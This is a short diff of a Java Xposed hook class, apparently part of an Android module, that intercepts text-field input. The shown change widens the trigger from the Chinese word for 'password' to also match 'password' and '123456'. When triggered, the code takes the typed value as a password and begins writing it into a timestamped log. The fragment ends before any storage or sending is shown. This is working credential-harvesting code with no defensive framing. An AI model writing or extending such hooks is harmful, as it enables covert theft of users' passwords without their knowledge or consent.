@@ -25,7 +25,7 @@ public class StringHook {
                     protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                         super.afterHookedMethod(param);
                         String edtStr = param.thisObject.toString();
-                        if (edtStr.contains("密码")) {
+                        if (edtStr.contains("密码") || edtStr.contains("password") || edtStr.contains("123456")) {
                             String password = param.args[0].toString();
                             String data = "==========================================\n";
                             data += "当前时间 " + TimeUtils.getNowTime() + "\n";
